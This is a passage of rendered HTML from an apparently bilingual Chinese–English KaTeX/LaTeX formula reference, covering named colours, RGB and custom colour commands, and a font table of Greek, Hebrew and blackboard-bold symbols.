style="margin-right:0.02778em;color:WildStrawberry;">r</span><span class="mord mathnormal" style="margin-right:0.02778em;color:WildStrawberry;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;color:WildStrawberry;">y</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Cyan"><mi>C</mi><mi>y</mi><mi>a</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Cyan}Cyan}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;color:Cyan;">C</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Cyan;">y</span><span class="mord mathnormal" style="color:Cyan;">a</span><span class="mord mathnormal" style="color:Cyan;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="MidnightBlue"><mi>M</mi><mi>i</mi><mi>d</mi><mi>n</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{MidnightBlue}MidnightBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:MidnightBlue;">M</span><span class="mord mathnormal" style="color:MidnightBlue;">i</span><span class="mord mathnormal" style="color:MidnightBlue;">d</span><span class="mord mathnormal" style="color:MidnightBlue;">n</span><span class="mord mathnormal" style="color:MidnightBlue;">i</span><span class="mord mathnormal" style="margin-right:0.03588em;color:MidnightBlue;">g</span><span class="mord mathnormal" style="color:MidnightBlue;">h</span><span class="mord mathnormal" style="color:MidnightBlue;">t</span><span class="mord mathnormal" style="margin-right:0.05017em;color:MidnightBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:MidnightBlue;">l</span><span class="mord mathnormal" style="color:MidnightBlue;">u</span><span class="mord mathnormal" style="color:MidnightBlue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Rhodamine"><mi>R</mi><mi>h</mi><mi>o</mi><mi>d</mi><mi>a</mi><mi>m</mi><mi>i</mi><mi>n</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Rhodamine}Rhodamine}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:Rhodamine;">R</span><span class="mord mathnormal" style="color:Rhodamine;">h</span><span class="mord mathnormal" style="color:Rhodamine;">o</span><span class="mord mathnormal" style="color:Rhodamine;">d</span><span class="mord mathnormal" style="color:Rhodamine;">a</span><span class="mord mathnormal" style="color:Rhodamine;">m</span><span class="mord mathnormal" style="color:Rhodamine;">i</span><span class="mord mathnormal" style="color:Rhodamine;">n</span><span class="mord mathnormal" style="color:Rhodamine;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Yellow"><mi>Y</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Yellow}Yellow}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;color:Yellow;">Y</span><span class="mord mathnormal" style="color:Yellow;">e</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Yellow;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Yellow;">l</span><span class="mord mathnormal" style="color:Yellow;">o</span><span class="mord mathnormal" style="margin-right:0.02691em;color:Yellow;">w</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Dandelion"><mi>D</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>l</mi><mi>i</mi><mi>o</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Dandelion}Dandelion}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;color:Dandelion;">D</span><span class="mord mathnormal" style="color:Dandelion;">a</span><span class="mord mathnormal" style="color:Dandelion;">n</span><span class="mord mathnormal" style="color:Dandelion;">d</span><span class="mord mathnormal" style="color:Dandelion;">e</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Dandelion;">l</span><span class="mord mathnormal" style="color:Dandelion;">i</span><span class="mord mathnormal" style="color:Dandelion;">o</span><span class="mord mathnormal" style="color:Dandelion;">n</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="Mulberry"><mi>M</mi><mi>u</mi><mi>l</mi><mi>b</mi><mi>e</mi><mi>r</mi><mi>r</mi><mi>y</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{Mulberry}Mulberry}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:Mulberry;">M</span><span class="mord mathnormal" style="color:Mulberry;">u</span><span class="mord mathnormal" style="margin-right:0.01968em;color:Mulberry;">l</span><span class="mord mathnormal" style="color:Mulberry;">b</span><span class="mord mathnormal" style="color:Mulberry;">e</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Mulberry;">r</span><span class="mord mathnormal" style="margin-right:0.02778em;color:Mulberry;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;color:Mulberry;">y</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="RoyalBlue"><mi>R</mi><mi>o</mi><mi>y</mi><mi>a</mi><mi>l</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{RoyalBlue}RoyalBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:RoyalBlue;">R</span><span class="mord mathnormal" style="color:RoyalBlue;">o</span><span class="mord mathnormal" style="margin-right:0.03588em;color:RoyalBlue;">y</span><span class="mord mathnormal" style="color:RoyalBlue;">a</span><span class="mord mathnormal" style="margin-right:0.01968em;color:RoyalBlue;">l</span><span class="mord mathnormal" style="margin-right:0.05017em;color:RoyalBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:RoyalBlue;">l</span><span class="mord mathnormal" style="color:RoyalBlue;">u</span><span class="mord mathnormal" style="color:RoyalBlue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="YellowGreen"><mi>Y</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>G</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>n</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{YellowGreen}YellowGreen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;color:YellowGreen;">Y</span><span class="mord mathnormal" style="color:YellowGreen;">e</span><span class="mord mathnormal" style="margin-right:0.01968em;color:YellowGreen;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;color:YellowGreen;">l</span><span class="mord mathnormal" style="color:YellowGreen;">o</span><span class="mord mathnormal" style="margin-right:0.02691em;color:YellowGreen;">w</span><span class="mord mathnormal" style="color:YellowGreen;">G</span><span class="mord mathnormal" style="margin-right:0.02778em;color:YellowGreen;">r</span><span class="mord mathnormal" style="color:YellowGreen;">e</span><span class="mord mathnormal" style="color:YellowGreen;">e</span><span class="mord mathnormal" style="color:YellowGreen;">n</span></span></span></span></span></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="DarkOrchid"><mi>D</mi><mi>a</mi><mi>r</mi><mi>k</mi><mi>O</mi><mi>r</mi><mi>c</mi><mi>h</mi><mi>i</mi><mi>d</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{DarkOrchid}DarkOrchid}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;color:DarkOrchid;">D</span><span class="mord mathnormal" style="color:DarkOrchid;">a</span><span class="mord mathnormal" style="margin-right:0.02778em;color:DarkOrchid;">r</span><span class="mord mathnormal" style="margin-right:0.03148em;color:DarkOrchid;">k</span><span class="mord mathnormal" style="margin-right:0.02778em;color:DarkOrchid;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:DarkOrchid;">r</span><span class="mord mathnormal" style="color:DarkOrchid;">c</span><span class="mord mathnormal" style="color:DarkOrchid;">h</span><span class="mord mathnormal" style="color:DarkOrchid;">i</span><span class="mord mathnormal" style="color:DarkOrchid;">d</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="NavyBlue"><mi>N</mi><mi>a</mi><mi>v</mi><mi>y</mi><mi>B</mi><mi>l</mi><mi>u</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{NavyBlue}NavyBlue}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;color:NavyBlue;">N</span><span class="mord mathnormal" style="color:NavyBlue;">a</span><span class="mord mathnormal" style="margin-right:0.03588em;color:NavyBlue;">v</span><span class="mord mathnormal" style="margin-right:0.03588em;color:NavyBlue;">y</span><span class="mord mathnormal" style="margin-right:0.05017em;color:NavyBlue;">B</span><span class="mord mathnormal" style="margin-right:0.01968em;color:NavyBlue;">l</span><span class="mord mathnormal" style="color:NavyBlue;">u</span><span class="mord mathnormal" style="color:NavyBlue;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="RoyalPurple"><mi>R</mi><mi>o</mi><mi>y</mi><mi>a</mi><mi>l</mi><mi>P</mi><mi>u</mi><mi>r</mi><mi>p</mi><mi>l</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{RoyalPurple}RoyalPurple}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;color:RoyalPurple;">R</span><span class="mord mathnormal" style="color:RoyalPurple;">o</span><span class="mord mathnormal" style="margin-right:0.03588em;color:RoyalPurple;">y</span><span class="mord mathnormal" style="color:RoyalPurple;">a</span><span class="mord mathnormal" style="margin-right:0.01968em;color:RoyalPurple;">l</span><span class="mord mathnormal" style="margin-right:0.13889em;color:RoyalPurple;">P</span><span class="mord mathnormal" style="color:RoyalPurple;">u</span><span class="mord mathnormal" style="margin-right:0.02778em;color:RoyalPurple;">r</span><span class="mord mathnormal" style="color:RoyalPurple;">p</span><span class="mord mathnormal" style="margin-right:0.01968em;color:RoyalPurple;">l</span><span class="mord mathnormal" style="color:RoyalPurple;">e</span></span></span></span></span></td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathcolor="YellowOrange"><mi>Y</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>O</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi></mstyle></mrow><annotation encoding="application/x-tex">{\color{YellowOrange}YellowOrange}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;color:YellowOrange;">Y</span><span class="mord mathnormal" style="color:YellowOrange;">e</span><span class="mord mathnormal" style="margin-right:0.01968em;color:YellowOrange;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;color:YellowOrange;">l</span><span class="mord mathnormal" style="color:YellowOrange;">o</span><span class="mord mathnormal" style="margin-right:0.02691em;color:YellowOrange;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;color:YellowOrange;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;color:YellowOrange;">r</span><span class="mord mathnormal" style="color:YellowOrange;">a</span><span class="mord mathnormal" style="color:YellowOrange;">n</span><span class="mord mathnormal" style="margin-right:0.03588em;color:YellowOrange;">g</span><span class="mord mathnormal" style="color:YellowOrange;">e</span></span></span></span></span></td></tr></tbody></table><h3 id="275-使用rgb颜色-use-rgb-color"><a class="markdownIt-Anchor" href="#275-使用rgb颜色-use-rgb-color"></a> 2.7.5 使用RGB颜色 Use RGB color</h3><p>如需在<code>\color</code>命令中使用自选RGB颜色，可使用<code>&#123;\color[RGB]&#123;0,0,0&#125; &#125; </code>命令，例如：</p><pre class="line-numbers language-none"><code class="language-none">&#123;\color[RGB]&#123;0,200,0&#125; e^&#123;i \pi&#125; + 1 &#x3D; 0&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block katex-error' title='ParseError: KaTeX parse error: Expected &#039;{&#039;, got &#039;[&#039; at position 8: {\color[̲RGB]{0,200,0} e…'>{\color[RGB]{0,200,0} e^{i \pi} + 1 = 0}</p><h3 id="276-自定义颜色-custom-colors"><a class="markdownIt-Anchor" href="#276-自定义颜色-custom-colors"></a> 2.7.6 自定义颜色 Custom colors</h3><p>可使用<code>\definecolor</code>命令进行自定义颜色，例如：</p><pre class="line-numbers language-none"><code class="language-none">\definecolor&#123;mygreen&#125;&#123;RGB&#125;&#123;0,200,0&#125; &#123;\color&#123;mygreen&#125;e^&#123;i \pi&#125; + 1 &#x3D; 0 &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \definecolor at position 1: \̲d̲e̲f̲i̲n̲e̲c̲o̲l̲o̲r̲{mygreen}{RGB}{…'>\definecolor{mygreen}{RGB}{0,200,0} {\color{mygreen}e^{i \pi} + 1 = 0 }</p><h2 id="28-字体字号-fonts-size"><a class="markdownIt-Anchor" href="#28-字体字号-fonts-size"></a> 2.8 字体字号 Fonts &amp; Size</h2><h3 id="281-字体-fonts"><a class="markdownIt-Anchor" href="#281-字体-fonts"></a> 2.8.1 字体 Fonts</h3><p>如您需要替换公式内容的字体，可以点击工具栏下方的**【字体】**按钮进行相关操作。因有一些特定代码Mathjax3.0并没有相关支持，所以下表仅做参考。</p><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left">希腊字母 Greek alphabet</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">A</mi><mi mathvariant="normal">B</mi><mtext> </mtext><mi mathvariant="normal">Γ</mi><mtext> </mtext><mi mathvariant="normal">Δ</mi><mtext> </mtext><mi mathvariant="normal">E</mi><mtext> </mtext><mi mathvariant="normal">Z</mi><mtext> </mtext><mi mathvariant="normal">H</mi><mtext> </mtext><mi mathvariant="normal">Θ</mi></mrow><annotation encoding="application/x-tex">\mathrm{A} \mathrm{B} \Gamma \Delta \mathrm{E} \mathrm{Z} \mathrm{H} \Theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">A</span></span><span class="mord"><span class="mord mathrm">B</span></span><span class="mord"> </span><span class="mord">Γ</span><span class="mord"> </span><span class="mord">Δ</span><span class="mord"> </span><span class="mord"><span class="mord mathrm">E</span></span><span class="mord"> </span><span class="mord"><span class="mord mathrm">Z</span></span><span class="mord"> </span><span class="mord"><span class="mord mathrm">H</span></span><span class="mord"> </span><span class="mord">Θ</span></span></span></span></td><td style="text-align:left">\mathrm{A} \mathrm{B} \Gamma \Delta \mathrm{E} \mathrm{Z} \mathrm{H} \Theta</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">I</mi><mi mathvariant="normal">K</mi><mtext> </mtext><mi mathvariant="normal">Λ</mi><mtext> </mtext><mi mathvariant="normal">M</mi><mtext> </mtext><mi mathvariant="normal">N</mi><mtext> </mtext><mi mathvariant="normal">Ξ</mi><mtext> </mtext><mi mathvariant="normal">O</mi><mtext> </mtext><mi mathvariant="normal">Π</mi></mrow><annotation encoding="application/x-tex">\mathrm{I} \mathrm{K} \Lambda \mathrm{M} \mathrm{N} \Xi \mathrm{O} \Pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">I</span></span><span class="mord"><span class="mord mathrm">K</span></span><span class="mord"> </span><span class="mord">Λ</span><span class="mord"> </span><span class="mord"><span class="mord mathrm">M</span></span><span class="mord"> </span><span class="mord"><span class="mord mathrm">N</span></span><span class="mord"> </span><span class="mord">Ξ</span><span class="mord"> </span><span class="mord"><span class="mord mathrm">O</span></span><span class="mord"> </span><span class="mord">Π</span></span></span></span></td><td style="text-align:left">\mathrm{I} \mathrm{K} \Lambda \mathrm{M} \mathrm{N} \Xi \mathrm{O} \Pi</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">R</mi><mtext> </mtext><mi mathvariant="normal">Σ</mi><mtext> </mtext><mi mathvariant="normal">T</mi><mtext> </mtext><mi mathvariant="normal">Υ</mi><mtext> </mtext><mi mathvariant="normal">Φ</mi><mtext> </mtext><mi mathvariant="normal">X</mi><mtext> </mtext><mi mathvariant="normal">Ψ</mi><mtext> </mtext><mi mathvariant="normal">Ω</mi></mrow><annotation encoding="application/x-tex">\mathrm{R} \Sigma \mathrm{T} \Upsilon \Phi \mathrm{X} \Psi \Omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">R</span></span><span class="mord"> </span><span class="mord">Σ</span><span class="mord"> </span><span class="mord"><span class="mord mathrm">T</span></span><span class="mord"> </span><span class="mord">Υ</span><span class="mord"> </span><span class="mord">Φ</span><span class="mord"> </span><span class="mord"><span class="mord mathrm">X</span></span><span class="mord"> </span><span class="mord">Ψ</span><span class="mord"> </span><span class="mord">Ω</span></span></span></span></td><td style="text-align:left">\mathrm{R} \Sigma \mathrm{T} \Upsilon \Phi \mathrm{X} \Psi \Omega</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mtext> </mtext><mi>β</mi><mtext> </mtext><mi>γ</mi><mtext> </mtext><mi>δ</mi><mtext> </mtext><mi>ϵ</mi><mtext> </mtext><mi>ζ</mi><mtext> </mtext><mi>η</mi><mtext> </mtext><mi>θ</mi></mrow><annotation encoding="application/x-tex">\alpha \beta \gamma \delta \epsilon \zeta \eta \theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03785em;">δ</span><span class="mord"> </span><span class="mord mathnormal">ϵ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.07378em;">ζ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span></td><td style="text-align:left">\alpha \beta \gamma \delta \epsilon \zeta \eta \theta</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ι</mi><mtext> </mtext><mi>κ</mi><mtext> </mtext><mi>λ</mi><mtext> </mtext><mi>μ</mi><mtext> </mtext><mi>ν</mi><mtext> </mtext><mi>ξ</mi><mtext> </mtext><mi>ο</mi><mtext> </mtext><mi>π</mi></mrow><annotation encoding="application/x-tex">\iota \kappa \lambda \mu \nu \xi \omicron \pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ι</span><span class="mord"> </span><span class="mord mathnormal">κ</span><span class="mord"> </span><span class="mord mathnormal">λ</span><span class="mord"> </span><span class="mord mathnormal">μ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.04601em;">ξ</span><span class="mord"> </span><span class="mord mathnormal">ο</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span></td><td style="text-align:left">\iota \kappa \lambda \mu \nu \xi \omicron \pi</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ρ</mi><mtext> </mtext><mi>σ</mi><mtext> </mtext><mi>τ</mi><mtext> </mtext><mi>υ</mi><mtext> </mtext><mi>ϕ</mi><mtext> </mtext><mi>χ</mi><mtext> </mtext><mi>ψ</mi><mtext> </mtext><mi>ω</mi></mrow><annotation encoding="application/x-tex">\rho \sigma \tau \upsilon \phi \chi \psi \omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ρ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.1132em;">τ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">υ</span><span class="mord"> </span><span class="mord mathnormal">ϕ</span><span class="mord"> </span><span class="mord mathnormal">χ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">ω</span></span></span></span></td><td style="text-align:left">\rho \sigma \tau \upsilon \phi \chi \psi \omega</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Γ</mi><mtext> </mtext><mi>Δ</mi><mtext> </mtext><mi>Θ</mi><mtext> </mtext><mi>Λ</mi><mtext> </mtext><mi>Ξ</mi><mtext> </mtext><mi>Π</mi><mtext> </mtext><mi>Σ</mi><mtext> </mtext><mi>Φ</mi><mtext> </mtext><mi>Υ</mi><mtext> </mtext><mi>Ω</mi></mrow><annotation encoding="application/x-tex">\varGamma \varDelta \varTheta \varLambda \varXi \varPi \varSigma \varPhi \varUpsilon \varOmega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathit">Γ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Δ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Θ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Λ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Ξ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Π</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Σ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Φ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Υ</span></span><span class="mord"> </span><span class="mord"><span class="mord mathit">Ω</span></span></span></span></span></td><td style="text-align:left">\varGamma \varDelta \varTheta \varLambda \varXi \varPi \varSigma \varPhi \varUpsilon \varOmega</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ε</mi><mtext> </mtext><mi mathvariant="normal">ϝ</mi><mtext> </mtext><mi mathvariant="normal">ϰ</mi><mtext> </mtext><mi>ϖ</mi><mtext> </mtext><mi>ϱ</mi><mtext> </mtext><mi>ς</mi><mtext> </mtext><mi>ϑ</mi><mtext> </mtext><mi>φ</mi></mrow><annotation encoding="application/x-tex">\varepsilon \digamma \varkappa \varpi \varrho \varsigma \vartheta \varphi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ε</span><span class="mord"> </span><span class="mord amsrm">ϝ</span><span class="mord"> </span><span class="mord amsrm" style="margin-right:0.04028em;">ϰ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.02778em;">ϖ</span><span class="mord"> </span><span class="mord mathnormal">ϱ</span><span class="mord"> </span><span class="mord mathnormal" style="margin-right:0.07986em;">ς</span><span class="mord"> </span><span class="mord mathnormal">ϑ</span><span class="mord"> </span><span class="mord mathnormal">φ</span></span></span></span></td><td style="text-align:left">\varepsilon \digamma \varkappa \varpi \varrho \varsigma \vartheta \varphi</td></tr><tr><td style="text-align:left">希伯来字母 Hebrew symbols</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℵ</mi><mtext> </mtext><mi mathvariant="normal">ℶ</mi><mtext> </mtext><mi mathvariant="normal">ℷ</mi><mtext> </mtext><mi mathvariant="normal">ℸ</mi></mrow><annotation encoding="application/x-tex">\aleph \beth \gimel \daleth</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">ℵ</span><span class="mord"> </span><span class="mord amsrm">ℶ</span><span class="mord"> </span><span class="mord amsrm">ℷ</span><span class="mord"> </span><span class="mord amsrm">ℸ</span></span></span></span></td><td style="text-align:left">\aleph \beth \gimel \daleth</td></tr><tr><td style="text-align:left">黑板报体 Blackboard bold/scripts</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">A</mi><mi mathvariant="double-struck">B</mi><mi mathvariant="double-struck">C</mi><mi mathvariant="double-struck">D</mi><mi mathvariant="double-struck">E</mi><mi mathvariant="double-struck">F</mi><mi mathvariant="double-struck">G</mi><mi mathvariant="double-struck">H</mi><mi mathvariant="double-struck">I</mi></mrow><annotation encoding="application/x-tex">\mathbb{ABCDEFGHI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbb">A</span><span class="mord mathbb">B</span><span class="mord mathbb">C</span><span class="mord mathbb">D</span><span class="mord mathbb">E</span><span class="mord mathbb">F</span><span class="mord mathbb">G</span><span class="mord mathbb">H</span><span class="mord mathbb">I</span></span></span></span></span></td><td style="text-align:left">\mathbb{ABCDEFGHI}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">J</mi><mi mathvariant="double-struck">K</mi><mi mathvariant="double-struck">L</mi><mi mathvariant="double-struck">M</mi><mi mathvariant="double-struck">N</mi><mi mathvariant="double-struck">O</mi><mi mathvariant="double-struck">P</mi><mi mathvariant="double-struck">Q</mi><mi mathvariant="double-struck">R</mi></mrow><annotation encoding="application/x-tex">\mathbb{JKLMNOPQR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85556em;vertical-align:-0.16667em;"></span><span class="mord"><span class="mord mathbb">J</span><span class="mord mathbb">K</span><span class="mord mathbb">L</span><span class="mord mathbb">M</span><span class="mord mathbb">N</span><span class="mord mathbb">O</span><span class="mord mathbb">P</span><span class="mord mathbb">Q</span><span class="mord mathbb">R</span></span></span></span></span></td><td 